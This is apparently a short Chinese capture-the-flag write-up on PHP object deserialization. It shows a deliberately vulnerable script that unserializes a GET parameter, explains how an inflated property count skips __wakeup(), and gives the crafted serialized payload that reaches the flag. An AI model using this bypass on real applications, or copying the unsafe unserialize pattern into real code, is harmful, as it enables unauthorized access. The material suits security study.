#PHP序列化 
```php
<?php      
	header("Content-type:text/html;charset=utf-8");   
	error_reporting(0);   
	show_source("class.php");      
	class HaHaHa{                 
		public $admin;           
		public $passwd;              
		public function __construct(){            
			$this->admin ="user";            
			$this->passwd = "123456";           
		}              
		public function __wakeup(){            
			$this->passwd = sha1($this->passwd);           
		}              
		public function __destruct(){               
			if($this->admin === "admin" && $this->passwd === "wllm"){                   include("flag.php");                   
				echo $flag;               
			}else{                   
				echo $this->passwd;                   
				echo "No wake up";               
			}           
		}       
	}      
	$Letmeseesee = $_GET['p'];   
	unserialize($Letmeseesee);      
?>
```

php的特性，当序列化后对象的参数列表中成员个数和实际个数不符合时会绕过 `__weakup()`;

因而构造
```php
$p=new HaHaHa();
$p->admin="admin";
$p->passwd="wllm";
print(serialize($p));
```

输出
```php
O:6:"HaHaHa":2:{s:5:"admin";s:5:"admin";s:6:"passwd";s:4:"wllm";}
```

改变成员个数，传入
```php
O:6:"HaHaHa":7:{s:5:"admin";s:5:"admin";s:6:"passwd";s:4:"wllm";}
```